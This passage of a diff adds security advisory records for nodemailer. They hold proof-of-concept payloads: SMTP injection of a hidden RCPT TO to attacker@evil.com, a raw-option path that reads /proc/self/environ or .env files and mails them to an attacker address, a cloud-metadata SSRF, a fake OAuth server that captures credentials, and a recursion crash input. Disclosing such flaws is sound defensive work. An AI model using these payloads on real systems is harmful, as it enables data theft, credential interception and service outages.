['recipient@example.com'],\n            size: '100\\r\\nRCPT TO:<attacker@evil.com>',\n        },\n    }, (err) => {\n        if (err) console.error('Error:', err.message);\n        console.log('\\nExpected output above:');\n        console.log('  C: MAIL FROM:<sender@example.com> SIZE=100');\n        console.log('  C: RCPT TO:<attacker@evil.com>        <-- INJECTED');\n        console.log('  C: RCPT TO:<recipient@example.com>');\n        server.close();\n        transporter.close();\n    });\n});\n```\n\n**Expected output:**\n```\nSMTP server on port 12345\nSending email with injected RCPT TO...\n\nC: EHLO [127.0.0.1]\nC: MAIL FROM:<sender@example.com> SIZE=100\nC: RCPT TO:<attacker@evil.com>\nC: RCPT TO:<recipient@example.com>\nC: DATA\n...\nC: .\nC: QUIT\n```\n\nThe `RCPT TO:<attacker@evil.com>` line is injected by the CRLF in the `size` field, silently adding an extra recipient to the email.\n\n### Impact\nThis is an SMTP command injection vulnerability. An attacker who can influence the `envelope.size` property in a `sendMail()` call can:\n\n- **Silently add hidden recipients** to outgoing emails via injected `RCPT TO` commands, receiving copies of all emails sent through the affected transport\n- **Inject arbitrary SMTP commands** (e.g., `RSET`, additional `MAIL FROM` to send entirely separate emails through the server)\n- **Leverage the sending organization's SMTP server reputation** for spam or phishing delivery\n\nThe severity is mitigated by the fact that the `envelope` object must be explicitly provided by the application. Nodemailer's default envelope construction from message headers does not include `size`. Applications that pass through user-controlled data to the envelope options (e.g., via API parameters, admin panels, or template configurations) are vulnerable.\n\nAffected versions: at least v8.0.3 (current); likely all versions where `envelope.size` is supported.",
+      "aliases": [
+        "CVE-2026-82854"
+      ],
+      "modified": "2026-09-10T03:50:38.497772249Z",
+      "published": "2026-03-26T22:26:46Z",
+      "database_specific": {
+        "nvd_published_at": null,
+        "cwe_ids": [
+          "CWE-93"
+        ],
+        "severity": "LOW",
+        "github_reviewed": true,
+        "github_reviewed_at": "2026-03-26T22:26:46Z"
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodemailer/nodemailer/security/advisories/GHSA-c7w3-x93f-qmm8"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodemailer/nodemailer/commit/2d7b9710e63555a1eb13d721296c51186d4b5651"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/nodemailer/nodemailer"
+        }
+      ],
+      "affected": [
+        {
+          "package": {
+            "name": "nodemailer",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/nodemailer"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "0"
+                },
+                {
+                  "fixed": "8.0.4"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-c7w3-x93f-qmm8/GHSA-c7w3-x93f-qmm8.json"
+          }
+        }
+      ],
+      "schema_version": "1.9.0",
+      "severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-hwqf-gcqm-7353",
+      "summary": "Header injection in nodemailer",
+      "details": "The package nodemailer before 6.6.1 are vulnerable to HTTP Header Injection if unsanitized user input that may contain newlines and carriage returns is passed into an address object.",
+      "aliases": [
+        "CVE-2021-23400"
+      ],
+      "modified": "2025-01-14T09:12:20.581301Z",
+      "published": "2021-12-10T18:56:57Z",
+      "database_specific": {
+        "github_reviewed_at": "2021-06-30T17:38:02Z",
+        "nvd_published_at": "2021-06-29T12:15:00Z",
+        "cwe_ids": [
+          "CWE-74"
+        ],
+        "severity": "MODERATE",
+        "github_reviewed": true
+      },
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-23400"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodemailer/nodemailer/issues/1289"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodemailer/nodemailer/commit/7e02648cc8cd863f5085bad3cd09087bccf84b9f"
+        },
+        {
+          "type": "WEB",
+          "url": "https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1314737"
+        },
+        {
+          "type": "WEB",
+          "url": "https://snyk.io/vuln/SNYK-JS-NODEMAILER-1296415"
+        }
+      ],
+      "affected": [
+        {
+          "package": {
+            "name": "nodemailer",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/nodemailer"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "0"
+                },
+                {
+                  "fixed": "6.6.1"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2021/12/GHSA-hwqf-gcqm-7353/GHSA-hwqf-gcqm-7353.json"
+          }
+        }
+      ],
+      "schema_version": "1.9.0",
+      "severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:L"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-mm7p-fcc7-pg87",
+      "summary": "Nodemailer: Email to an unintended domain can occur due to Interpretation Conflict",
+      "details": "The email parsing library incorrectly handles quoted local-parts containing @. This leads to misrouting of email recipients, where the parser extracts and routes to an unintended domain instead of the RFC-compliant target.\n\nPayload: `\"xclow3n@gmail.com x\"@internal.domain`\nUsing the following code to send mail\n```\nconst nodemailer = require(\"nodemailer\");\n\nlet transporter = nodemailer.createTransport({\n  service: \"gmail\",\n  auth: {\n    user: \"\",\n    pass: \"\",\n  },\n});\n\nlet mailOptions = {\n  from: '\"Test Sender\" <your_email@gmail.com>', \n  to: \"\\\"xclow3n@gmail.com x\\\"@internal.domain\",\n  subject: \"Hello from Nodemailer\",\n  text: \"This is a test email sent using Gmail SMTP and Nodemailer!\",\n};\n\ntransporter.sendMail(mailOptions, (error, info) => {\n  if (error) {\n    return console.log(\"Error: \", error);\n  }\n  console.log(\"Message sent: %s\", info.messageId);\n\n});\n\n\n(async () => {\n  const parser = await import(\"@sparser/email-address-parser\");\n  const { EmailAddress, ParsingOptions } = parser.default;\n  const parsed = EmailAddress.parse(mailOptions.to /*, new ParsingOptions(true) */);\n\n  if (!parsed) {\n    console.error(\"Invalid email address:\", mailOptions.to);\n    return;\n  }\n\n  console.log(\"Parsed email:\", {\n    address: `${parsed.localPart}@${parsed.domain}`,\n    local: parsed.localPart,\n    domain: parsed.domain,\n  });\n})();\n```\n\nRunning the script and seeing how this mail is parsed according to RFC\n\n```\nParsed email: {\n  address: '\"xclow3n@gmail.com x\"@internal.domain',\n  local: '\"xclow3n@gmail.com x\"',\n  domain: 'internal.domain'\n}\n```\n\nBut the email is sent to `xclow3n@gmail.com`\n\n<img width=\"2128\" height=\"439\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/20eb459c-9803-45a2-b30e-5d1177d60a8d\" />\n\n\n### Impact:\n\n-    Misdelivery / Data leakage: Email is sent to psres.net instead of test.com.\n\n-    Filter evasion: Logs and anti-spam systems may be bypassed by hiding recipients inside quoted local-parts.\n\n-    Potential compliance issue: Violates RFC 5321/5322 parsing rules.\n\n-    Domain based access control bypass in downstream applications using your library to send mails\n\n### Recommendations\n\n-    Fix parser to correctly treat quoted local-parts per RFC 5321/5322.\n\n-    Add strict validation rejecting local-parts containing embedded @ unless fully compliant with quoting.",
+      "aliases": [
+        "CVE-2025-13033"
+      ],
+      "modified": "2026-09-10T03:50:30.113440777Z",
+      "published": "2025-10-07T13:42:02Z",
+      "database_specific": {
+        "severity": "MODERATE",
+        "github_reviewed": true,
+        "github_reviewed_at": "2025-10-07T13:42:02Z",
+        "nvd_published_at": null,
+        "cwe_ids": [
+          "CWE-20",
+          "CWE-436"
+        ]
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodemailer/nodemailer/security/advisories/GHSA-mm7p-fcc7-pg87"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-13033"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodemailer/nodemailer/commit/1150d99fba77280df2cfb1885c43df23109a8626"
+        },
+        {
+          "type": "WEB",
+          "url": "https://access.redhat.com/security/cve/CVE-2025-13033"
+        },
+        {
+          "type": "WEB",
+          "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2402179"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/nodemailer/nodemailer"
+        }
+      ],
+      "affected": [
+        {
+          "package": {
+            "name": "nodemailer",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/nodemailer"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "0"
+                },
+                {
+                  "fixed": "7.0.7"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/10/GHSA-mm7p-fcc7-pg87/GHSA-mm7p-fcc7-pg87.json"
+          }
+        }
+      ],
+      "schema_version": "1.9.0",
+      "severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N/E:P"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-p6gq-j5cr-w38f",
+      "summary": "Nodemailer: Message-level raw option bypasses disableFileAccess/disableUrlAccess, enabling arbitrary file read and full-response SSRF in the delivered message",
+      "details": "# Message-level `raw` option bypasses `disableFileAccess` / `disableUrlAccess`, enabling arbitrary file read and full-response SSRF in the sent message\n\n- **Target:** nodemailer/nodemailer, npm `nodemailer` **v9.0.0** (HEAD `4e58450eb490e5097a74b2b2cce35a8d9e21856e`)\n- **Verdict:** CONFIRMED (local PoC, no network)\n\n## Summary\n\nNodemailer exposes `disableFileAccess` and `disableUrlAccess` so an application that passes\n**untrusted** message data to the library can forbid that data from reading local files or\nfetching URLs. Every attachment, alternative, `html`/`text`/`watchHtml`/`amp` and `icalEvent`\ncontent node honors these flags. **The message-level `raw` option does not.**\n\n`MailComposer.compile()` builds the root MIME node for a `raw` message **without** threading the\ntwo flags, so a `raw: { path: '/etc/passwd' }` or `raw: { href: 'http://169.254.169.254/\u2026' }`\nmessage is read / fetched anyway, and the file or HTTP-response bytes become the **actual\nmessage that is sent** by every transport (SMTP, SES, sendmail, stream, JSON). An actor whose\ninput the application intended to sandbox therefore obtains arbitrary local-file disclosure and\na full-response SSRF primitive, delivered to a recipient the same actor can choose.\n\nThis is the same vulnerability class as the already-published jsonTransport advisory\n**GHSA-wqvq-jvpq-h66f**, but a **distinct code path** (`raw` root node, not `normalize()`), and\nstrictly higher impact: the jsonTransport bug only affected the locally-returned JSON, whereas\nthis affects the delivered RFC822 message for all transports.\n\n## Affected component\n\n- `lib/mail-composer/index.js:34-35` \u2014 root cause:\n  ```js\n  if (this.mail.raw) {\n      this.message = new MimeNode('message/rfc822', { newline: this.mail.newline }).setRaw(this.mail.raw);\n  }\n  ```\n  The `MimeNode` is constructed with only `{ newline }`. Compare the sibling node builders\n  `_createMixed`/`_createAlternative`/`_createRelated`/`_createContentNode`\n  (`lib/mail-composer/index.js:389-527`), which all pass\n  `disableUrlAccess: this.mail.disableUrlAccess, disableFileAccess: this.mail.disableFileAccess`.\n- `lib/mime-node/index.js:51-52` \u2014 the constructor derives `this.disableFileAccess`/\n  `this.disableUrlAccess` solely from its own `options`; children do **not** inherit a parent's\n  flags (`createChild`/`appendChild`, lines 175-194, pass options through verbatim).\n- `lib/mime-node/index.js:812` \u2014 `setRaw()` content is resolved through `this._getStream(this._raw)`.\n- `lib/mime-node/index.js:984-1010` \u2014 `_getStream` reads the file (`fs.createReadStream`, 995) or\n  fetches the URL (`nmfetch`, 1009) **only guarded by `this.disableFileAccess`/`this.disableUrlAccess`**,\n  which on the `raw` root node are `false`.\n- Reached from the normal send flow at `lib/mailer/index.js:188`\n  (`mail.message = new MailComposer(mail.data).compile()`), so every transport is affected.\n\n## Reachability gate (hop-by-hop)\n\n1. **Source.** Application calls `transporter.sendMail({ raw: <userControlled> , to: <userControlled> })`\n   with `disableFileAccess: true` and/or `disableUrlAccess: true` configured on the transporter\n   (forced onto `mail.data` in `lib/mailer/mail-message.js:36-40`) or per message. This is the\n   exact scenario the flags exist for \u2014 the same precondition under which GHSA-wqvq-jvpq-h66f was\n   accepted.\n2. **Guard \u2014 the access flags.** For attachments the flag is enforced: a node created by\n   `_createContentNode` carries `disableFileAccess`, so `_getStream` throws `EFILEACCESS`.\n   **Bypass:** the `raw` branch (`compile():34-35`) never sets the flag on its node, so\n   `this.disableFileAccess === false` and the guard at `mime-node:985` / `:999` is skipped.\n   There is no other validation between `mail.raw` and the read; `raw` content shapes\n   (`{path}`, `{href}`, stream, string, buffer) are accepted as-is by `setRaw`/`_getStream`.\n3. **Sink.** `fs.createReadStream(content.path)` (file disclosure) or\n   `nmfetch(content.href, \u2026)` (SSRF). The resulting bytes are emitted as the message body by\n   `createReadStream()`, which every transport pipes to its destination\n   (`smtp-transport:233`, `smtp-pool/pool-resource:208`, `ses-transport:96`, `sendmail-transport:184`,\n   `stream-transport:67`).\n\nNo guard blocks the chain; the only guard (the access flags) is structurally absent on this node.\n\n## Root cause\n\nInconsistent enforcement: the access policy is applied per-`MimeNode` via constructor options and\nmust be re-passed at every node creation. The `raw`-message shortcut in `compile()` omits it,\nwhile all five other node builders include it. The flags are therefore enforced for every content\ntype *except* the one that lets the caller supply a complete message body by path/URL.\n\n## Exploit path\n\nApplication that sandboxes untrusted mail input (`disableFileAccess`/`disableUrlAccess` set):\n\n1. Untrusted actor supplies `raw: { path: '/proc/self/environ' }` (or any server file:\n   `/app/.env`, key material, etc.) and `to: attacker@evil.test`.\n2. `compile()` builds the raw root node without the flags; the transport reads the file and sends\n   its contents as the message \u2192 **arbitrary server-file exfiltration to an attacker-chosen mailbox.**\n3. Alternatively `raw: { href: 'http://127.0.0.1:8080/admin' }` or a cloud metadata URL \u2192\n   Nodemailer fetches it server-side and delivers the full response body in the email \u2192\n   **full-response SSRF** (no blind-channel limitation).\n\n## Impact\n\n- **Confidentiality (High):** arbitrary local file read disclosed in the outgoing message;\n  full-response SSRF to internal/metadata endpoints, also disclosed in the message.\n- **Integrity (Low):** attacker-fetched/file content is injected into the delivered mail.\n- The two protective flags an application relies on to contain untrusted input are silently\n  ineffective for `raw`.\n\n## Preconditions\n\nThe application (a) passes `disableFileAccess` and/or `disableUrlAccess` (the documented sandboxing\nflags) and (b) lets untrusted input influence the `raw` field (and, for maximal disclosure, `to`).\nNo other configuration is required; all bundled transports are affected. This mirrors the accepted\nprecondition of GHSA-wqvq-jvpq-h66f.\n\n## Severity\n\n- **AV** \u2014 message data routinely originates over the network in the apps these flags protect.\n- **AC** \u2014 a single crafted `raw` object; deterministic.\n- **PR** \u2014 the actor is a user whose input the app already treats as untrusted (the reason the\n  flags are set); not fully anonymous in the typical deployment.\n- **UI** \u2014 no victim interaction.\n- **S** \u2014 impact within Nodemailer's process scope.\n- **C** \u2014 arbitrary file read **and** full-response SSRF, both delivered to an attacker-chosen\n  recipient. (The sibling jsonTransport advisory used C:L because its leak stayed in locally-returned\n  JSON; here the bytes leave the system in the sent message, so C:H is warranted.)\n- **I** \u2014 attacker injects fetched/file bytes into the outgoing message.\n- **A**.\nNote: if a deployment fixes the recipient (`to` not attacker-controlled) the disclosure channel\nnarrows and the rating degrades toward the sibling's Medium; the High rating reflects the\nreasonable worst case where `raw` and `to` are both untrusted.\n\n## Adversarial re-read (attempts to refute)\n\n1. **\"`raw` content is by-design trusted, so the flags shouldn't apply.\"** Rejected: every other\n   content path (attachments, alternatives, html/text, icalEvent) honors the flags, and the\n   maintainer already accepted GHSA-wqvq-jvpq-h66f for exactly this \"untrusted input + flag set\"\n   model. The asymmetry \u2014 attachment `{path}` is blocked but `raw:{path}` is not \u2014 is the bug, and\n   the PoC's CONTROL case proves the flag is otherwise effective on the same file.\n2. **\"The raw node inherits the flags via rootNode.\"** Rejected by code and by PoC: `compile():35`\n   constructs the node with `{ newline }` only; `MimeNode` constructor sets\n   `this.disableFileAccess = !!options.disableFileAccess` \u2192 `false`; `rootNode` is itself; no\n   inheritance exists.\n3. **\"The PoC leaks for an unrelated reason.\"** Rejected: the CONTROL message (`attachments:[{path}]`,\n   same file, same transporter) returns `EFILEACCESS`; only the `raw:{path}` message leaks. The\n   sentinel nonce exists solely in the temp file; the URL nonce is generated server-side and is only\n   obtainable by an actual fetch. Both observables are uniquely bound to the bypass.\n4. **\"Maybe only jsonTransport (already reported) is affected.\"** Rejected: the PoC uses\n   `streamTransport` and the root cause is in `MailComposer.compile()` (`mailer:188`), shared by all\n   transports; jsonTransport is a different (already-fixed) path.\n\nI could not find any guard that blocks the chain; the finding survives.\n\n## Proof of concept (safe, benign)\n\n`findings/nodemailer/raw/poc-raw-fileaccess-bypass.js` \u2014 local, no network egress (loopback only),\nno destructive action. Output:\n```\n[CONTROL] attachment path with disableFileAccess: BLOCKED (EFILEACCESS) \u2014 flag works here\n[ATTACK]  raw:{path} with disableFileAccess=true: BYPASSED \u2014 sentinel file CONTENT present in message\n[ATTACK]  raw:{href} with disableUrlAccess=true (loopback server): BYPASSED \u2014 fetched body present (SSRF)\nVERDICT: CONFIRMED\n```\nRun: `node findings/nodemailer/raw/poc-raw-fileaccess-bypass.js` (exit 0 = confirmed).\n\n## Remediation\n\nThread the access policy onto the `raw` root node, exactly as the other builders do:\n```js\nif (this.mail.raw) {\n    this.message = new MimeNode('message/rfc822', {\n        newline: this.mail.newline,\n        disableFileAccess: this.mail.disableFileAccess,\n        disableUrlAccess: this.mail.disableUrlAccess\n    }).setRaw(this.mail.raw);\n}\n```\n(Defense in depth: `setRaw`/`_getStream` could also refuse `{path}`/`{href}` raw content when either\nflag is set, regardless of how the node was constructed.) Add a regression test asserting that\n`raw:{path}` and `raw:{href}` reject with `EFILEACCESS`/`EURLACCESS` when the flags are set, mirroring\nthe attachment tests.",
+      "aliases": [
+        "CVE-2026-82659"
+      ],
+      "modified": "2026-09-10T03:51:09.280402513Z",
+      "published": "2026-06-18T14:28:05Z",
+      "database_specific": {
+        "severity": "HIGH",
+        "github_reviewed": true,
+        "github_reviewed_at": "2026-06-18T14:28:05Z",
+        "nvd_published_at": null,
+        "cwe_ids": [
+          "CWE-73",
+          "CWE-918"
+        ]
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/Sif-0x01/security-advisories/security/advisories/GHSA-68x8-4h5v-r533"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodemailer/nodemailer/security/advisories/GHSA-p6gq-j5cr-w38f"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-82659"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodemailer/nodemailer/commit/a82e060d978f27e5f41369a9a9807b1e3dedc2e2"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/nodemailer/nodemailer"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodemailer/nodemailer/releases/tag/v9.0.1"
+        },
+        {
+          "type": "WEB",
+          "url": "https://www.vulncheck.com/advisories/nodemailer-before-9.0.1-file-read-and-ssrf-via-raw-option"
+        }
+      ],
+      "affected": [
+        {
+          "package": {
+            "name": "nodemailer",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/nodemailer"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "0"
+                },
+                {
+                  "fixed": "9.0.1"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "last_known_affected_version_range": "<= 9.0.0",
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-p6gq-j5cr-w38f/GHSA-p6gq-j5cr-w38f.json"
+          }
+        }
+      ],
+      "schema_version": "1.9.0",
+      "severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-r7g4-qg5f-qqm2",
+      "summary": "Nodemailer: Improper TLS Certificate Validation in OAuth2 Token Fetch Enables Credential Interception",
+      "details": "### Summary\nNodemailer disables TLS certificate verification in its internal HTTPS fetch client through the use of rejectUnauthorized: false inside lib/fetch/index.js.\n\nAs a result, OAuth2 token requests trust invalid or self-signed HTTPS certificates and transmit sensitive OAuth credentials over connections that should fail TLS validation.\n\nAn attacker in a machine-in-the-middle position can intercept OAuth2 credential exchanges and capture:\n\n- OAuth client_secret\n- refresh_token\n- access tokens\n\nThe issue was verified through runtime testing using a self-signed HTTPS OAuth endpoint.\n\n### Details\nRoot Cause\n\nThe issue originates from the internal HTTPS fetch implementation used by Nodemailer for OAuth2 token retrieval and related outbound HTTPS requests.\n\nInside:\n\n`lib/fetch/index.js`\n\nthe request options contain:\n\n`rejectUnauthorized: false`\n\nThis disables TLS peer certificate verification globally for the internal HTTPS client unless explicitly overridden through optional TLS configuration.\n\nAs a result:\n\n- self-signed certificates are trusted\n- invalid CA chains are accepted\n- hostname validation is bypassed\n- attacker-controlled HTTPS endpoints are treated as trusted\n\nThis violates expected HTTPS security guarantees.\n\n**Vulnerable Flow**\n\nThe vulnerable execution chain is:\n\nOAuth2 Transport\n        \u2193\nXOAuth2 token generation\n        \u2193\nInternal HTTPS fetch client\n        \u2193\nHTTPS request with rejectUnauthorized:false\n        \u2193\nAttacker-controlled/self-signed endpoint trusted\n        \u2193\nOAuth credentials **transmitted**\n\n\n### PoC\n**Environment**\n#### Mail API (app/server.js)\n```\nconst express = require(\"express\");\nconst nodemailer = require(\"nodemailer\");\nrequire(\"dotenv\").config();\n\nconst app = express();\n\napp.use(express.json());\n\nconst transporter = nodemailer.createTransport({\n    host: process.env.SMTP_HOST,\n    port: process.env.SMTP_PORT,\n    secure: false,\n    auth: {\n        user: process.env.SMTP_USER,\n        pass: process.env.SMTP_PASS\n    }\n});\n\napp.post(\"/send\", async (req, res) => {\n    try {\n        const { to, subject, text, html } = req.body;\n\n        const info = await transporter.sendMail({\n            from: `\"Mailer\" <${process.env.SMTP_USER}>`,\n            to,\n            subject,\n            text,\n            html\n        });\n\n        res.json({\n            success: true,\n            messageId: info.messageId\n        });\n\n    } catch (err) {\n        console.error(err);\n        res.status(500).json({\n            success: false,\n            error: err.message\n        });\n    }\n});\n\napp.listen(process.env.PORT, () => {\n    console.log(`Mailer running on port ${process.env.PORT}`);\n});\n```\n\n#### Malicious HTTPS OAuth Server (poc/evil-oauth.js)\n\n```\nconst https = require('https');\nconst fs = require('fs');\n\nhttps.createServer({\n    key: fs.readFileSync('./key.pem'),\n    cert: fs.readFileSync('./cert.pem')\n}, (req, res) => {\n\n    console.log('\\n==== REQUEST INTERCEPTED ====');\n    console.log(req.method, req.url);\n\n    let body = '';\n\n    req.on('data', chunk => {\n        body += chunk;\n    });\n\n    req.on('end', () => {\n\n        console.log('\\nPOST BODY:');\n        console.log(body);\n\n        res.writeHead(200, {\n            'Content-Type': 'application/json'\n        });\n\n        res.end(JSON.stringify({\n            access_token: 'attacker_token',\n            expires_in: 3600\n        }));\n    });\n\n}).listen(8443, () => {\n    console.log('Malicious HTTPS OAuth server listening on 8443');\n});\n```\n\n#### Nodemailer OAuth2 Test (test.js)\n\n```\nconst nodemailer = require('./');\n\nconst transporter = nodemailer.createTransport({\n    service: 'gmail',\n\n    auth: {\n        type: 'OAuth2',\n\n        user: 'redacted@example.com',\n\n        clientId: 'CLIENT_ID_REDACTED',\n        clientSecret: 'CLIENT_SECRET_REDACTED',\n\n        refreshToken: 'REFRESH_TOKEN_REDACTED',\n\n        accessUrl: 'https://localhost:8443/token'\n    }\n});\n\ntransporter.sendMail({\n    from: 'redacted@example.com',\n    to: 'redacted@example.com',\n    subject: 'PoC',\n    text: 'test'\n\n}, (err, info) => {\n\n    console.log('\\n==== NODEMAILER RESULT ====');\n\n    if (err) {\n        console.error(err);\n    } else {\n        console.log(info);\n    }\n});\n```\n**Steps to Reproduce**\n\n- Start malicious HTTPS OAuth server:\n- node poc/evil-oauth.js\n- Run Nodemailer OAuth2 test:\n- node test.js\n- Observe intercepted OAuth2 request body on the malicious HTTPS server.\n\n**PIC**\n<img width=\"1919\" height=\"1029\" alt=\"image\" src=\"https://github.com/user-attachments/assets/fdeafeb4-c0c5-49f8-beeb-e7f945be0516\" />\n\n### Impact\n\n- OAuth credential theft\n- unauthorized email access\n- persistent token abuse\n- unauthorized mail sending\n- mailbox compromise\n- interception/tampering of OAuth responses\n\nThe issue effectively downgrades HTTPS security protections for sensitive OAuth credential exchanges.",
+      "aliases": [
+        "CVE-2026-82662"
+      ],
+      "modified": "2026-10-05T23:00:05.741897723Z",
+      "published": "2026-06-15T17:34:48Z",
+      "database_specific": {
+        "nvd_published_at": null,
+        "cwe_ids": [
+          "CWE-295"
+        ],
+        "severity": "HIGH",
+        "github_reviewed": true,
+        "github_reviewed_at": "2026-06-15T17:34:48Z"
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/nodemailer/nodemailer/security/advisories/GHSA-r7g4-qg5f-qqm2"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-82662"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/nodemailer/nodemailer"
+        },
+        {
+          "type": "WEB",
+          "url": "https://www.vulncheck.com/advisories/nodemailer-before-8.0.8-tls-certificate-validation-bypass"
+        }
+      ],
+      "affected": [
+        {
+          "package": {
+            "name": "nodemailer",
+            "ecosystem": "npm",
+            "purl": "pkg:npm/nodemailer"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "0"
+                },
+                {
+                  "fixed": "8.0.8"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "last_known_affected_version_range": "<= 8.0.7",
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-r7g4-qg5f-qqm2/GHSA-r7g4-qg5f-qqm2.json"
+          }
+        }
+      ],
+      "schema_version": "1.9.0",
+      "severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:N"
+        },
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-rcmh-qjqh-p98v",
+      "summary": "Nodemailer\u2019s addressparser is vulnerable to DoS caused by recursive calls",
+      "details": "### Summary\nA DoS can occur that immediately halts the system due to the use of an unsafe function.\n\n### Details\nAccording to **RFC 5322**, nested group structures (a group inside another group) are not allowed. Therefore, in lib/addressparser/index.js, the email address parser performs flattening when nested groups appear, since such input is likely to be abnormal. (If the address is valid, it is added as-is.) In other words, the parser flattens all nested groups and inserts them into the final group list.\nHowever, the code implemented for this flattening process can be exploited by malicious input and triggers DoS\n\nRFC 5322 uses a colon (:) to define a group, and commas (,) are used to separate members within a group.\nAt the following location in lib/addressparser/index.js:\n\nhttps://github.com/nodemailer/nodemailer/blob/master/lib/addressparser/index.js#L90\n\nthere is code that performs this flattening. The issue occurs when the email address parser attempts to process the following kind of malicious address header:\n\n```g0: g1: g2: g3: ... gN: victim@example.com;```\n\nBecause no recursion depth limit is enforced, the parser repeatedly invokes itself in the pattern\n`addressparser \u2192 _handleAddress \u2192 addressparser \u2192 ...`\nfor each nested group. As a result, when an attacker sends a header containing many colons, Nodemailer enters infinite recursion, eventually throwing Maximum call stack size exceeded and causing the process to terminate immediately. Due to the structure of this behavior, no authentication is required, and a single request is enough to shut down the service.\n\nThe problematic code section is as follows:\n```js\nif (isGroup) {\n    ...\n    if (data.group.length) {\n        let parsedGroup = addressparser(data.group.join(',')); // <- boom!\n        parsedGroup.forEach(member => {\n            if (member.group) {\n                groupMembers = groupMembers.concat(member.group);\n            } else {\n                groupMembers.push(member);\n            }\n        });\n    }\n}\n```\n`data.group` is expected to contain members separated by commas, but in the attacker\u2019s payload the group contains colon `(:)` tokens. Because of this, the parser repeatedly triggers recursive calls for each colon, proportional to their number.\n\n### PoC\n\n```\nconst nodemailer = require('nodemailer');\n\nfunction buildDeepGroup(depth) {\n  let parts = [];\n  for (let i = 0; i < depth; i++) {\n    parts.push(`g${i}:`);\n  }\n  return parts.join(' ') + ' user@example.com;';\n}\n\nconst DEPTH = 3000; // <- control depth \nconst toHeader = buildDeepGroup(DEPTH);\nconsole.log('to header length:', toHeader.length);\n\nconst transporter = nodemailer.createTransport({\n  streamTransport: true,\n  buffer: true,\n  newline: 'unix'\n});\n\nconsole.log('parsing start');\n\ntransporter.sendMail(\n  {\n    from: 'test@example.com',\n    to: toHeader,\n    subject: 'test',\n    text: 'test'\n  },\n  (err, info) => {\n    if (err) {\n      console.error('error:', err);\n    } else {\n      console.log('finished :', info && info.envelope);\n    }\n  }\n);\n```\nAs a result, when the colon is repeated beyond a certain threshold, the Node.js process terminates immediately.\n\n### Impact\nThe attacker can achieve the following:\n\n1. Force an immediate crash of any server/service that uses Nodemailer\n2. Kill the backend process with a single web request\n3. In environments using PM2/Forever, trigger a continuous restart loop, causing severe resource exhaustion\u201d",
+      "aliases": [
+        "CVE-2025-14874"
+      ],
+      "modified": "2026-09-10T03:50:58.906017759Z",
+      "published": "2025-12-01T20:44:25Z",
+      "database_specific": {
+        "github_reviewed_at": "2025-12-01T20:44:25Z",
+        "nvd_published_at": null,
+        "cwe_ids": [
